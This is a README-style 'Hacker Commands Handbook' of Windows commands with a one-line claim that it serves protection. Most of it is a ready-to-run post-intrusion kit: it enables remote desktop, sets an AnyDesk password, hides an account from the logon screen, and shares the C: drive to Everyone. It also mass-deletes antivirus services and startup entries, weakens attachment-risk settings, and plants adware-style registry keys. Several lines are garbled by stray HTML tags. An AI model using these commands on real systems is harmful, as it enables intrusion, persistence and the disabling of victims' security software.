# Hacker Commands Handbook

<h2>What is this</h2>
<p>It is a handbook with the commands most used by hackers.</p>

<h2>Why do we need this ?</h2>
<p>For protect your systems against hackers!</p>

<b>Contents</b>
<ul>
<li><a href="#systeminfo">Systeminfo (Get Information About System)</a></li>
<li><a href="#cmd">CMD, Netsh and Regedit</a></li>
<li><a href="#net">Net Accounts</a></li>
<li><a href="#wmi">WMI (Send WMI Query for User Account Evasion)</a></li>
<li><a href="#sch">Scheduled Tasks</a></li>
<li><a href="#antimalware">Anti-Malware Services Evasion</a></li>
<li><a href="#elevate">Elevate</a></li>
</ul>

<b id="systeminfo">Systeminfo</b>
<ul>
<li>hostname</li>
<li>whoami /all</li>
<li>net use</li>
<li>route print</li>
<li>ipconfig /all</li>
<li>arp -a</li>
</ul>

<b id="cmd">CMD, Netsh and Regedit</b>
<ul>
<li>cmdkey /list</li>
<li>whoami /all</li>
<li>systeminfo</li>
<li>netsh firewall set service type = remotedesktop mode = enable /all</li>
<li>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</li>
<li>cmd.exe /c echo b4ouDLG9trr | C:\ProgramData\anydesk.exe --set-password</li>
<li>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v WDAGUtilltyAccount /t REG_DWORD /d 0 /f</li>
<li>set "osX=%PROCESSOR_ARCHITECTURE%"</li>
</ul>

<b id="net">Net Accounts</b>
<ul>
<li>net user</li>
<li>net accounts</li>
<li>net share c=c:\ /GRANT:Everyone,FULL</li>
<li>net statistics workstation</li>
<li>net statistics server</li>
<li>net config workstation</li>
<li>net config server</li>
<li>net localgroup administrators</li>
</ul>

<b id="wmi">WMI</b>
<ul>
<li>wmic qfe list full /format:list</li>
<li>start /wait /min "msinfo32 /report c:\windows\temp\msinforeport.txt"</li>
<li>wmic product get name</li>
</ul>

<b id="sch">Scheduled Tasks</b>
<ul>
<li>schtasks /Query</li>
<li>schtasks /create /tn Demo /tr notepad.exe /sc ONIDLE /I 1 /f</li>
<li>schtasks | findstr Demo</li>
<li>schtasks /End /Tn Demo</li>
<li>schtasks /Delete /Tn Demo /f</li>
<li>REM schtasks /create /tn Demo1 /tr notepad.exe /sc once /st time /T /sd date /T /ru System</li>
</ul>

<b id="antimalware">Anti-Malware</b>
<ul>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\KSDE2.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\KSDE1.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP18.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP17.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP16.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP15.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP14.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP13.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP12.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP11.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP10.0.0" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\MBAMService" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAWFwk" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\MSK80Service" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAPExe" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McBootDelayStartSvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mccspsvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfefire" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\HomeNetSvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ModuleCoreService" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McMPFSvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mcpltsvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McProxy" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McODS" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfemms" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAfee SiteAdvisor Service" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfevtp" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McNaiAnn" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\nanosvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\NortonSecurity" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\!SASCORE" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\SBAMSvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ZillyaAVAuxSvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ZillyaAVCoreSvc" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\QHActiveDefense" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\avast! Antivirus" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\avast! Firewall" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVG Antivirus" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirMailService" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirService" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\Avira.ServiceHost" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirWebService" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirSchedulerService" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\vsservppl" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ProductAgentService" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\vsserv" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\updatesrv" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\cmdAgent" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\cmdvirth" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\DragonUpdater" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ekrn" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\0247141531883172mcinstcleanup" /f</li>
<li>Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\PEFService" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t <li>Reg_DWORD /d "24914" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t <li>Reg_SZ /d ".zip;.rar;.nfo;.txt;.exe;.bat;.com;.cmd;.<li>Reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "HideZoneInfoOnProperties" /t <li>Reg_DWORD /d "1" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t <li>Reg_DWORD /d "2" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "DisplayName" /t <li>Reg_SZ /d "RelevantKnowledge" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "UninstallString" /t <li>Reg_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg.exe -bootremove -uninst:RelevantKnowledge" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK_Path" /t <li>Reg_SZ /d "%windir%\system32\rlls.dll" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK64_Path" /t <li>Reg_SZ /d "%windir%\system32\rlls64.dll" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "LD64_Path" /t <li>Reg_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg64.exe" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "KS_Path" /t <li>Reg_SZ /d "%ProgramFiles%\RelevantKnowledge\rlls.dll" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "SV_Path" /t <li>Reg_SZ /d "%ProgramFiles%\RelevantKnowledge\rlservice.exe" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy" /v "" /t <li>Reg_SZ /d "" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RunLine" /t <li>Reg_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg.exe -boot" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "ServiceName" /t <li>Reg_SZ /d "RelevantKnowledge" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "UninstURL" /t <li>Reg_SZ /d "http://www.relevantknowledge.com/confirmuninstall.aspx?siteid=2600&campaign_id=794" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RevertPath" /t <li>Reg_SZ /d "%ProgramFiles%\RelevantKnowledge" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SB<li>RegRebootCleaner" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f</li>
<li>Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t REG_DWORD /d "24914" /f /reg:64</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".zip;.rar;.nfo;.txt;.exe;.bat;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;" /f /reg:64</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "HideZoneInfoOnProperties" /t REG_DWORD /d "1" /f /reg:64</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d "2" /f /reg:64</li>
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "DisplayName" /t REG_SZ /d "RelevantKnowledge" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "UninstallString" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg.exe -bootremove -uninst:RelevantKnowledge" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK_Path" /t REG_SZ /d "%windir%\system32\rlls.dll" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK64_Path" /t REG_SZ /d "%windir%\system32\rlls64.dll" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "LD64_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg64.exe" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "KS_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlls.dll" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "SV_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlservice.exe" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy" /v "" /t REG_SZ /d "" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RunLine" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg.exe -boot" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "ServiceName" /t REG_SZ /d "RelevantKnowledge" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "UninstURL" /t REG_SZ /d "http://www.relevantknowledge.com/confirmuninstall.aspx?siteid=2600&campaign_id=794" /f /reg:32
<li>Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RevertPath" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SB<li>RegRebootCleaner" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:32
<li>Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:32
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SB<li>RegRebootCleaner" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f /reg:64</li>
<li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64</li>
<li>Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64</li>
</ul>

<b id="elevate">Elevating</b>
<ul>
<li>Reg Add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "1" /f /reg:32</li>
</ul>
